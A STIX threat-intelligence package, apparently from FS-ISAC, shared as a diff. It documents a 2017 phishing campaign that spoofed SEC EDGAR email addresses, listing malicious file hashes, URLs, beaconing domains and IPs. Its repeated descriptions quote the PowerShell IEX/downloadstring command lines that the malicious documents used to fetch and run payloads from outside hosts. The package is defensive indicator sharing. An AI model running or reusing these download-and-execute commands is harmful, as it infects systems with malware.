@@ -1,0 +1,452 @@
+<stix:STIX_Package 
+	xmlns:cyboxCommon="http://cybox.mitre.org/common-2"
+	xmlns:cybox="http://cybox.mitre.org/cybox-2"
+	xmlns:cyboxVocabs="http://cybox.mitre.org/default_vocabularies-2"
+	xmlns:FileObj="http://cybox.mitre.org/objects#FileObject-2"
+	xmlns:URIObj="http://cybox.mitre.org/objects#URIObject-2"
+	xmlns:marking="http://data-marking.mitre.org/Marking-1"
+	xmlns:tlpMarking="http://data-marking.mitre.org/extensions/MarkingStructure#TLP-1"
+	xmlns:fsisac="http://fsisac.com/"
+	xmlns:edge="http://soltra.com/"
+	xmlns:indicator="http://stix.mitre.org/Indicator-2"
+	xmlns:stixCommon="http://stix.mitre.org/common-1"
+	xmlns:stixVocabs="http://stix.mitre.org/default_vocabularies-1"
+	xmlns:stix="http://stix.mitre.org/stix-1"
+	xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" id="edge:Package-2d3c4148-4663-49f9-8614-183a5bbd041e" version="1.1.1" timestamp="2017-11-16T23:38:09.362646+00:00">
+    <stix:STIX_Header>
+        <stix:Handling>
+            <marking:Marking>
+                <marking:Controlled_Structure>../../../../descendant-or-self::node() | ../../../../descendant-or-self::node()/@*</marking:Controlled_Structure>
+                <marking:Marking_Structure xsi:type='tlpMarking:TLPMarkingStructureType' color="GREEN"/>
+            </marking:Marking>
+        </stix:Handling>
+    </stix:STIX_Header>
+    <stix:Observables cybox_major_version="2" cybox_minor_version="1" cybox_update_version="0">
+        <cybox:Observable id="fsisac:Observable-a561fe02-0967-4f5b-a656-1326721cc739">
+            <cybox:Observable_Composition operator="OR">
+                <cybox:Observable idref="fsisac:Observable-0ad9fcb7-ff7d-474b-84b8-329086f35dfc">
+                </cybox:Observable>
+                <cybox:Observable idref="fsisac:Observable-e1d1cd27-c383-4d0b-b65a-c79d10f82a3b">
+                </cybox:Observable>
+                <cybox:Observable idref="fsisac:Observable-a7efc1d4-e0fa-4811-8fc8-af477c840a2d">
+                </cybox:Observable>
+                <cybox:Observable idref="fsisac:Observable-78616284-5b80-4b30-b178-ab218f113df8">
+                </cybox:Observable>
+                <cybox:Observable idref="fsisac:Observable-7afafb02-75a8-4142-b03e-95a326d3d29b">
+                </cybox:Observable>
+                <cybox:Observable idref="fsisac:Observable-9d235248-f7d1-4039-8b0b-1d1d0718b193">
+                </cybox:Observable>
+            </cybox:Observable_Composition>
+        </cybox:Observable>
+        <cybox:Observable id="fsisac:Observable-9d235248-f7d1-4039-8b0b-1d1d0718b193">
+            <cybox:Title>File: 3a7956ac437c87fc6ca594c59d4de086ed6c8865</cybox:Title>
+            <cybox:Description>Malicious File Hash</cybox:Description>
+            <cybox:Object id="fsisac:File-878a1bb6-8e8d-4f4a-afa9-dc3ef596586b">
+                <cybox:Properties xsi:type="FileObj:FileObjectType">
+                    <FileObj:Hashes>
+                        <cyboxCommon:Hash>
+                            <cyboxCommon:Type condition="Equals" xsi:type="cyboxVocabs:HashNameVocab-1.0">SHA1</cyboxCommon:Type>
+                            <cyboxCommon:Simple_Hash_Value condition="Equals">3a7956ac437c87fc6ca594c59d4de086ed6c8865</cyboxCommon:Simple_Hash_Value>
+                        </cyboxCommon:Hash>
+                    </FileObj:Hashes>
+                </cybox:Properties>
+            </cybox:Object>
+        </cybox:Observable>
+        <cybox:Observable id="fsisac:Observable-78616284-5b80-4b30-b178-ab218f113df8">
+            <cybox:Title>File: 1a1294fce91af3f7e7691f8307d07aebd4636402e4e6a244faac5ac9b36f8428</cybox:Title>
+            <cybox:Description>Malicious File Hash</cybox:Description>
+            <cybox:Object id="fsisac:File-0cfbdf70-0280-4b51-a83e-7a90718e4d87">
+                <cybox:Properties xsi:type="FileObj:FileObjectType">
+                    <FileObj:Hashes>
+                        <cyboxCommon:Hash>
+                            <cyboxCommon:Type condition="Equals" xsi:type="cyboxVocabs:HashNameVocab-1.0">SHA256</cyboxCommon:Type>
+                            <cyboxCommon:Simple_Hash_Value condition="Equals">1a1294fce91af3f7e7691f8307d07aebd4636402e4e6a244faac5ac9b36f8428</cyboxCommon:Simple_Hash_Value>
+                        </cyboxCommon:Hash>
+                    </FileObj:Hashes>
+                </cybox:Properties>
+            </cybox:Object>
+        </cybox:Observable>
+        <cybox:Observable id="fsisac:Observable-7afafb02-75a8-4142-b03e-95a326d3d29b">
+            <cybox:Title>File: 8d650fccdf3497112708a3f4832240905bc6b0c3</cybox:Title>
+            <cybox:Description>Malicious File Hash</cybox:Description>
+            <cybox:Object id="fsisac:File-f669d7d2-a96b-4663-93bb-6f7ff4495fec">
+                <cybox:Properties xsi:type="FileObj:FileObjectType">
+                    <FileObj:Hashes>
+                        <cyboxCommon:Hash>
+                            <cyboxCommon:Type condition="Equals" xsi:type="cyboxVocabs:HashNameVocab-1.0">SHA1</cyboxCommon:Type>
+                            <cyboxCommon:Simple_Hash_Value condition="Equals">8d650fccdf3497112708a3f4832240905bc6b0c3</cyboxCommon:Simple_Hash_Value>
+                        </cyboxCommon:Hash>
+                    </FileObj:Hashes>
+                </cybox:Properties>
+            </cybox:Object>
+        </cybox:Observable>
+        <cybox:Observable id="fsisac:Observable-a7efc1d4-e0fa-4811-8fc8-af477c840a2d">
+            <cybox:Title>File: bf38288956449bb120bae525b6632f0294d25593da8938bbe79849d6defed5cb</cybox:Title>
+            <cybox:Description>Malicious File Hash</cybox:Description>
+            <cybox:Object id="fsisac:File-49093de8-d51d-4fee-ac4d-2d757a1522e0">
+                <cybox:Properties xsi:type="FileObj:FileObjectType">
+                    <FileObj:Hashes>
+                        <cyboxCommon:Hash>
+                            <cyboxCommon:Type condition="Equals" xsi:type="cyboxVocabs:HashNameVocab-1.0">SHA256</cyboxCommon:Type>
+                            <cyboxCommon:Simple_Hash_Value condition="Equals">bf38288956449bb120bae525b6632f0294d25593da8938bbe79849d6defed5cb</cyboxCommon:Simple_Hash_Value>
+                        </cyboxCommon:Hash>
+                    </FileObj:Hashes>
+                </cybox:Properties>
+            </cybox:Object>
+        </cybox:Observable>
+        <cybox:Observable id="fsisac:Observable-e1d1cd27-c383-4d0b-b65a-c79d10f82a3b">
+            <cybox:Title>File: 0bcadcf65bcf8940fff6fc776dd56563</cybox:Title>
+            <cybox:Description>Malicious File Hash</cybox:Description>
+            <cybox:Object id="fsisac:File-148f61a8-d121-42a6-ab25-902cf696a2cd">
+                <cybox:Properties xsi:type="FileObj:FileObjectType">
+                    <FileObj:Hashes>
+                        <cyboxCommon:Hash>
+                            <cyboxCommon:Type condition="Equals" xsi:type="cyboxVocabs:HashNameVocab-1.0">MD5</cyboxCommon:Type>
+                            <cyboxCommon:Simple_Hash_Value condition="Equals">0bcadcf65bcf8940fff6fc776dd56563</cyboxCommon:Simple_Hash_Value>
+                        </cyboxCommon:Hash>
+                    </FileObj:Hashes>
+                </cybox:Properties>
+            </cybox:Object>
+        </cybox:Observable>
+        <cybox:Observable id="fsisac:Observable-0ad9fcb7-ff7d-474b-84b8-329086f35dfc">
+            <cybox:Title>File: 2c0cfdc5b5653cb3e8b0f8eeef55fc32</cybox:Title>
+            <cybox:Description>Malicious File Hash</cybox:Description>
+            <cybox:Object id="fsisac:File-f8334206-461a-4640-9708-ff935041bb41">
+                <cybox:Properties xsi:type="FileObj:FileObjectType">
+                    <FileObj:Hashes>
+                        <cyboxCommon:Hash>
+                            <cyboxCommon:Type condition="Equals" xsi:type="cyboxVocabs:HashNameVocab-1.0">MD5</cyboxCommon:Type>
+                            <cyboxCommon:Simple_Hash_Value condition="Equals">2c0cfdc5b5653cb3e8b0f8eeef55fc32</cyboxCommon:Simple_Hash_Value>
+                        </cyboxCommon:Hash>
+                    </FileObj:Hashes>
+                </cybox:Properties>
+            </cybox:Object>
+        </cybox:Observable>
+        <cybox:Observable id="fsisac:Observable-4554fb35-152b-4422-86b0-1e58f639c5d5">
+            <cybox:Observable_Composition operator="OR">
+                <cybox:Observable idref="fsisac:Observable-51529408-1771-4f12-a3b7-75d1dc2afe7e">
+                </cybox:Observable>
+                <cybox:Observable idref="fsisac:Observable-a1f09e98-0beb-434c-a860-516431601571">
+                </cybox:Observable>
+                <cybox:Observable idref="fsisac:Observable-3c4ec6d0-ffe7-411b-b1ba-0b28542c3683">
+                </cybox:Observable>
+            </cybox:Observable_Composition>
+        </cybox:Observable>
+        <cybox:Observable id="fsisac:Observable-3c4ec6d0-ffe7-411b-b1ba-0b28542c3683">
+            <cybox:Title>URI: https://trt.doe.louisiana.gov/fonts.txt</cybox:Title>
+            <cybox:Description>Malicious URL</cybox:Description>
+            <cybox:Object id="fsisac:URI-dfc3a600-df61-48d9-b1d0-d5978b599a93">
+                <cybox:Properties xsi:type="URIObj:URIObjectType" type="URL">
+                    <URIObj:Value>https://trt.doe.louisiana.gov/fonts.txt</URIObj:Value>
+                </cybox:Properties>
+            </cybox:Object>
+        </cybox:Observable>
+        <cybox:Observable id="fsisac:Observable-51529408-1771-4f12-a3b7-75d1dc2afe7e">
+            <cybox:Title>URI: https://pastebin.com/raw/pxse2tj1</cybox:Title>
+            <cybox:Description>Malicious URL</cybox:Description>
+            <cybox:Object id="fsisac:URI-ff32fb06-0d8e-4e66-9b94-4af4fb54050c">
+                <cybox:Properties xsi:type="URIObj:URIObjectType" type="URL">
+                    <URIObj:Value>https://pastebin.com/raw/pxse2tj1</URIObj:Value>
+                </cybox:Properties>
+            </cybox:Object>
+        </cybox:Observable>
+        <cybox:Observable id="fsisac:Observable-a1f09e98-0beb-434c-a860-516431601571">
+            <cybox:Title>URI: http://roofingexperts.org/wp-content/themes/sp/examples/send_edgar_corps.php</cybox:Title>
+            <cybox:Description>Malicious URL</cybox:Description>
+            <cybox:Object id="fsisac:URI-2ebed556-12da-4480-b375-97419e2341f0">
+                <cybox:Properties xsi:type="URIObj:URIObjectType" type="URL">
+                    <URIObj:Value>http://roofingexperts.org/wp-content/themes/sp/examples/send_edgar_corps.php</URIObj:Value>
+                </cybox:Properties>
+            </cybox:Object>
+        </cybox:Observable>
+    </stix:Observables>
+    <stix:Indicators>
+        <stix:Indicator id="fsisac:indicator-1b7f1ea4-d589-4413-82aa-b38438df9859" timestamp="2017-10-11T21:06:36+00:00" xsi:type='indicator:IndicatorType'>
+            <indicator:Title>CYT3: Member Submission: Large Phishing Campaign Spoofing SEC Email Addresses (Tracking ID: 934290)</indicator:Title>
+            <indicator:Type xsi:type="stixVocabs:IndicatorTypeVocab-1.1">File Hash Watchlist</indicator:Type>
+            <indicator:Description>An FS-ISAC member has submitted information on a wide scale phishing campaign spoofing the Securities and Exchange Commission (SEC) email addresses.
+
+
+Starting on October 10, 2017 there was a large email phishingcampaign targeting a wide spectrum of financial and business email accounts. The emails sent were spoofed to appear to be coming from the Securities and Exchange Commission and contained a malicious attachment.
+
+Spoofed SEC Email Addresses:
+EDGAR[@]sec[.]gov
+fillings[@]sec[.]gov
+OIG[@]sec[.]gov
+
+Attachments:
+EDGAR_Rules_2017.docx
+EDGAR_Security_Bulletin.docx
+
+Subjects:
+"EDGAR Filings"
+"EDGAR Security Bulletin"
+
+Additional Header Information:
+Received: from hxxp://usa2.serverhoshbilling[.]com (hxxp://usa2.serverhoshbilling[.]com
+[209.90.232[.]236]) (Using TLS) by hxxp://us-smtp-1.mimecast[.]com with ESMTP id
+us-mta-82-sPO7t-twM86rhUHJlLn-5w-1; Tue, 10 Oct 2017 16:56:08 -0400
+Received: from salesapo by hxxp://usa2.serverhoshbilling[.]com with local (Exim 4.89) (envelope-from &lt;filings[@]sec[.]gov&gt;)
+From: EDGAR Filings &lt;filings[@]sec[.]gov&gt;
+Reply-To: EDGAR Filings &lt;filings[@]sec[.]gov&gt;
+
+This was found in the header and is the script that was to send the emails.
+X-PHP-Script: hxxp://roofingexperts[.]org/wp-content/themes/sp/examples/send_edgar_corps.php
+Please note that the SEC does publish their SPF records and if SPF protections are on these emails would be blocked:
+spf=fail (spfCheck: domain of hxxp://sec[.]gov does not designate 209.90.232[.]236 as permitted sender) client-ip=209.90.232[.]236; envelope-from=filings[@]sec[.]gov; helo=usa2.serverhoshbilling[.]com
+
+The email once opened prompts for additional external content download. If that is clicked the document launches cmd and powershell and attempts to download the payload. This does not connect to sec[.]gov, but only echoes that to the user while making the background connection to the payload. The below data was pulled from the open source reports listed at the bottom of the report.
+
+Example 1:
+WINWORD.EXE /n "C:\bf38288956449bb120bae525b6632f0294d25593da8938bbe79849d6defed5cb.docx" (PID: 2808) cmd.exe /k powershell -C ;echo "hxxps://sec[.]gov/";IEX((new-object net.webclient).downloadstring('hxxps://pastebin[.]com/raw/pxSE2TJ1')) (PID: 2704, Additional Context: %WINDIR%\system32\cmd.exe /k powershell -C echo "hxxps://sec[.]gov/".downloadstring('hxxps://pastebin[.]com/raw/pxSE2TJ1')) 
+powershell.exe "powershell -C ;echo "hxxps://sec[.]gov/";IEX((new-object net.webclient).downloadstring('hxxps://pastebin[.]com/raw/pxSE2TJ1')) (PID: 3028, Additional Context: powershell -C echo "hxxps://sec[.]gov/".downloadstring('hxxps://pastebin[.]com/raw/pxSE2TJ1'))
+ 
+Example 2:
+WINWORD.EXE /n "C:\1a1294fce91af3f7e7691f8307d07aebd4636402e4e6a244faac5ac9b36f8428.docx" (PID: 2856) cmd.exe /k powershell -C ;echo "hxxps://sec[.]gov/";IEX((new-object net.webclient).downloadstring('hxxps://trt.doe.louisiana[.]gov/fonts.txt')) (PID: 3008, Additional Context: %WINDIR%\system32\cmd.exe /k powershell -C echo "hxxps://sec[.]gov/".downloadstring('hxxps://trt.doe.louisiana[.]gov/fonts.txt'))
+
+powershell.exe "powershell -C ;echo "hxxps://sec[.]gov/";IEX((new-object net.webclient).downloadstring('hxxps://trt.doe.louisiana[.]gov/fonts.txt')) (PID: 3040, Additional Context: powershell -C echo "hxxps://sec[.]gov/".downloadstring('hxxps://trt.doe.louisiana[.]gov/fonts.txt'))
+
+Member Note: 
+This behavior is indicative of CVE-2017-0199. Below is a post from FireEye with additional information about the CVE.
+https://www.fireeye.com/blog/threat-research/2017/04/cve-2017-0199-hta-handler.html
+
+
+Suspected Payload Download:
+hxxps://trt.doe.louisiana[.]gov/fonts.txt
+hxxps://pastebin[.]com/raw/pxSE2TJ1
+
+Member Note:
+ We are still analyzing and deobfuscating the payload information and will provide additional information once we have it.
+
+
+DNS Domains Contacted (Post Infection Beaconing)
+ns1[.]press
+ns3[.]site
+ns4[.]site
+ns0[.]pw
+ns5[.]pw
+ns2[.]press
+ns3[.]site
+ns5[.]online
+ns1[.]online
+ns1[.]website
+ns0[.]space
+ns4[.]space
+ns5[.]biz
+ns0[.]site
+ns0[.]website
+ns3[.]space
+
+IP Addresses:
+209.90.232[.]236
+104.20.209[.]21
+206.218.181[.]46
+
+File Hashes:
+EDGAR_Rules_2017.docx
+VT 
+Detection ratio: 
+5 / 60
+MD5
+ 2c0cfdc5b5653cb3e8b0f8eeef55fc32
+SHA1
+ 3a7956ac437c87fc6ca594c59d4de086ed6c8865
+SHA256
+ 1a1294fce91af3f7e7691f8307d07aebd4636402e4e6a244faac5ac9b36f8428
+ssdeep 384:3/3Xu0XRRD3mbcLgboFX2Pk7Bn0i13LnZMCEOA3nBP38EA:3vxX3lE+287Bv13bWCZM538N
+File size
+ 16.9 KB ( 17348 bytes )
+File type
+ Office Open XML Document
+
+EDGAR_Rules_2017.docx
+VT 
+Detection ratio: 
+5 / 59
+MD5
+ 0bcadcf65bcf8940fff6fc776dd56563
+SHA1
+ 8d650fccdf3497112708a3f4832240905bc6b0c3
+SHA256
+ bf38288956449bb120bae525b6632f0294d25593da8938bbe79849d6defed5cb
+ssdeep 384:3/3XwqU1tc3mbcLgboFX2Pk7Bn0i13LwV/skCR3nBPm4Zru:3vwd1tc3lE+287Bv138ekCB5d8
+File size
+ 17.0 KB ( 17398 bytes )
+File type
+ Office Open XML Document
+
+
+Open Source Analysis Located:
+https://www.hybrid-analysis.com/sample/bf38288956449bb120bae525b6632f0294d25593da8938bbe79849d6defed5cb?environmentId=100
+https://www.hybrid-analysis.com/sample/1a1294fce91af3f7e7691f8307d07aebd4636402e4e6a244faac5ac9b36f8428?environmentId=100
+
+Member Note:
+ Whois data for the malicious DNS domains attached "CombinedWhois.txt". Please note these are just the indicators that we were able to find so far and any additional information will be provided when and if we have it. We are still looking for any other potential emails or documents that may have been sent as part of the campaign.</indicator:Description>
+            <indicator:Short_Description>An FS-ISAC member has submitted information on a wide scale phishing campaign spoofing the Securities and Exchange Commission (SEC) email addresses.
+
+</indicator:Short_Description>
+            <indicator:Observable idref="fsisac:Observable-a561fe02-0967-4f5b-a656-1326721cc739">
+            </indicator:Observable>
+            <indicator:Handling>
+                <marking:Marking>
+                    <marking:Controlled_Structure>../../../descendant-or-self::node() | ../../../descendant-or-self::node()/@*</marking:Controlled_Structure>
+                    <marking:Marking_Structure xsi:type='tlpMarking:TLPMarkingStructureType' color="GREEN"/>
+                </marking:Marking>
+            </indicator:Handling>
+            <indicator:Confidence timestamp="2017-10-11T21:06:36+00:00">
+                <stixCommon:Value xsi:type="stixVocabs:HighMediumLowVocab-1.0">Medium</stixCommon:Value>
+            </indicator:Confidence>
+            <indicator:Related_Indicators scope="exclusive">
+                <indicator:Related_Indicator>
+                    <stixCommon:Indicator idref="fsisac:indicator-4401dc8f-61c6-448e-9dcf-709db627b9c7" xsi:type='indicator:IndicatorType'/>
+                </indicator:Related_Indicator>
+            </indicator:Related_Indicators>
+            <indicator:Producer>
+                <stixCommon:Identity>
+                    <stixCommon:Name>SOC FS-ISAC &lt;soc@fsisac.us&gt;</stixCommon:Name>
+                </stixCommon:Identity>
+            </indicator:Producer>
+        </stix:Indicator>
+        <stix:Indicator id="fsisac:indicator-4401dc8f-61c6-448e-9dcf-709db627b9c7" timestamp="2017-10-11T21:06:36+00:00" xsi:type='indicator:IndicatorType'>
+            <indicator:Title>CYT3: Member Submission: Large Phishing Campaign Spoofing SEC Email Addresses (Tracking ID: 934290)</indicator:Title>
+            <indicator:Type xsi:type="stixVocabs:IndicatorTypeVocab-1.1">URL Watchlist</indicator:Type>
+            <indicator:Description>An FS-ISAC member has submitted information on a wide scale phishing campaign spoofing the Securities and Exchange Commission (SEC) email addresses.
+
+
+Starting on October 10, 2017 there was a large email phishingcampaign targeting a wide spectrum of financial and business email accounts. The emails sent were spoofed to appear to be coming from the Securities and Exchange Commission and contained a malicious attachment.
+
+Spoofed SEC Email Addresses:
+EDGAR[@]sec[.]gov
+fillings[@]sec[.]gov
+OIG[@]sec[.]gov
+
+Attachments:
+EDGAR_Rules_2017.docx
+EDGAR_Security_Bulletin.docx
+
+Subjects:
+"EDGAR Filings"
+"EDGAR Security Bulletin"
+
+Additional Header Information:
+Received: from hxxp://usa2.serverhoshbilling[.]com (hxxp://usa2.serverhoshbilling[.]com
+[209.90.232[.]236]) (Using TLS) by hxxp://us-smtp-1.mimecast[.]com with ESMTP id
+us-mta-82-sPO7t-twM86rhUHJlLn-5w-1; Tue, 10 Oct 2017 16:56:08 -0400
+Received: from salesapo by hxxp://usa2.serverhoshbilling[.]com with local (Exim 4.89) (envelope-from &lt;filings[@]sec[.]gov&gt;)
+From: EDGAR Filings &lt;filings[@]sec[.]gov&gt;
+Reply-To: EDGAR Filings &lt;filings[@]sec[.]gov&gt;
+
+This was found in the header and is the script that was to send the emails.
+X-PHP-Script: hxxp://roofingexperts[.]org/wp-content/themes/sp/examples/send_edgar_corps.php
+Please note that the SEC does publish their SPF records and if SPF protections are on these emails would be blocked:
+spf=fail (spfCheck: domain of hxxp://sec[.]gov does not designate 209.90.232[.]236 as permitted sender) client-ip=209.90.232[.]236; envelope-from=filings[@]sec[.]gov; helo=usa2.serverhoshbilling[.]com
+
+The email once opened prompts for additional external content download. If that is clicked the document launches cmd and powershell and attempts to download the payload. This does not connect to sec[.]gov, but only echoes that to the user while making the background connection to the payload. The below data was pulled from the open source reports listed at the bottom of the report.
+
+Example 1:
+WINWORD.EXE /n "C:\bf38288956449bb120bae525b6632f0294d25593da8938bbe79849d6defed5cb.docx" (PID: 2808) cmd.exe /k powershell -C ;echo "hxxps://sec[.]gov/";IEX((new-object net.webclient).downloadstring('hxxps://pastebin[.]com/raw/pxSE2TJ1')) (PID: 2704, Additional Context: %WINDIR%\system32\cmd.exe /k powershell -C echo "hxxps://sec[.]gov/".downloadstring('hxxps://pastebin[.]com/raw/pxSE2TJ1')) 
+powershell.exe "powershell -C ;echo "hxxps://sec[.]gov/";IEX((new-object net.webclient).downloadstring('hxxps://pastebin[.]com/raw/pxSE2TJ1')) (PID: 3028, Additional Context: powershell -C echo "hxxps://sec[.]gov/".downloadstring('hxxps://pastebin[.]com/raw/pxSE2TJ1'))
+ 
+Example 2:
+WINWORD.EXE /n "C:\1a1294fce91af3f7e7691f8307d07aebd4636402e4e6a244faac5ac9b36f8428.docx" (PID: 2856) cmd.exe /k powershell -C ;echo "hxxps://sec[.]gov/";IEX((new-object net.webclient).downloadstring('hxxps://trt.doe.louisiana[.]gov/fonts.txt')) (PID: 3008, Additional Context: %WINDIR%\system32\cmd.exe /k powershell -C echo "hxxps://sec[.]gov/".downloadstring('hxxps://trt.doe.louisiana[.]gov/fonts.txt'))
+
+powershell.exe "powershell -C ;echo "hxxps://sec[.]gov/";IEX((new-object net.webclient).downloadstring('hxxps://trt.doe.louisiana[.]gov/fonts.txt')) (PID: 3040, Additional Context: powershell -C echo "hxxps://sec[.]gov/".downloadstring('hxxps://trt.doe.louisiana[.]gov/fonts.txt'))
+
+Member Note: 
+This behavior is indicative of CVE-2017-0199. Below is a post from FireEye with additional information about the CVE.
+https://www.fireeye.com/blog/threat-research/2017/04/cve-2017-0199-hta-handler.html
+
+
+Suspected Payload Download:
+hxxps://trt.doe.louisiana[.]gov/fonts.txt
+hxxps://pastebin[.]com/raw/pxSE2TJ1
+
+Member Note:
+ We are still analyzing and deobfuscating the payload information and will provide additional information once we have it.
+
+
+DNS Domains Contacted (Post Infection Beaconing)
+ns1[.]press
+ns3[.]site
+ns4[.]site
+ns0[.]pw
+ns5[.]pw
+ns2[.]press
+ns3[.]site
+ns5[.]online
+ns1[.]online
+ns1[.]website
+ns0[.]space
+ns4[.]space
+ns5[.]biz
+ns0[.]site
+ns0[.]website
+ns3[.]space
+
+IP Addresses:
+209.90.232[.]236
+104.20.209[.]21
+206.218.181[.]46
+
+File Hashes:
+EDGAR_Rules_2017.docx
+VT 
+Detection ratio: 
+5 / 60
+MD5
+ 2c0cfdc5b5653cb3e8b0f8eeef55fc32
+SHA1
+ 3a7956ac437c87fc6ca594c59d4de086ed6c8865
+SHA256
+ 1a1294fce91af3f7e7691f8307d07aebd4636402e4e6a244faac5ac9b36f8428
+ssdeep 384:3/3Xu0XRRD3mbcLgboFX2Pk7Bn0i13LnZMCEOA3nBP38EA:3vxX3lE+287Bv13bWCZM538N
+File size
+ 16.9 KB ( 17348 bytes )
+File type
+ Office Open XML Document
+
+EDGAR_Rules_2017.docx
+VT 
+Detection ratio: 
+5 / 59
+MD5
+ 0bcadcf65bcf8940fff6fc776dd56563
+SHA1
+ 8d650fccdf3497112708a3f4832240905bc6b0c3
+SHA256
+ bf38288956449bb120bae525b6632f0294d25593da8938bbe79849d6defed5cb
+ssdeep 384:3/3XwqU1tc3mbcLgboFX2Pk7Bn0i13LwV/skCR3nBPm4Zru:3vwd1tc3lE+287Bv138ekCB5d8
+File size
+ 17.0 KB ( 17398 bytes )
+File type
+ Office Open XML Document
+
+
+Open Source Analysis Located:
+https://www.hybrid-analysis.com/sample/bf38288956449bb120bae525b6632f0294d25593da8938bbe79849d6defed5cb?environmentId=100
+https://www.hybrid-analysis.com/sample/1a1294fce91af3f7e7691f8307d07aebd4636402e4e6a244faac5ac9b36f8428?environmentId=100
+
+Member Note:
+ Whois data for the malicious DNS domains attached "CombinedWhois.txt". Please note these are just the indicators that we were able to find so far and any additional information will be provided when and if we have it. We are still looking for any other potential emails or documents that may have been sent as part of the campaign.</indicator:Description>
+            <indicator:Short_Description>An FS-ISAC member has submitted information on a wide scale phishing campaign spoofing the Securities and Exchange Commission (SEC) email addresses.
+
+</indicator:Short_Description>
+            <indicator:Observable idref="fsisac:Observable-4554fb35-152b-4422-86b0-1e58f639c5d5">
+            </indicator:Observable>
+            <indicator:Handling>
+                <marking:Marking>
+                    <marking:Controlled_Structure>../../../descendant-or-self::node() | ../../../descendant-or-self::node()/@*</marking:Controlled_Structure>
+                    <marking:Marking_Structure xsi:type='tlpMarking:TLPMarkingStructureType' color="GREEN"/>
+                </marking:Marking>
+            </indicator:Handling>
+            <indicator:Confidence timestamp="2017-10-11T21:06:36+00:00">
+                <stixCommon:Value xsi:type="stixVocabs:HighMediumLowVocab-1.0">Medium</stixCommon:Value>
+            </indicator:Confidence>
+            <indicator:Producer>
+                <stixCommon:Identity>
+                    <stixCommon:Name>SOC FS-ISAC &lt;soc@fsisac.us&gt;</stixCommon:Name>
+                </stixCommon:Identity>
+            </indicator:Producer>
+        </stix:Indicator>
+    </stix:Indicators>
+</stix:STIX_Package>
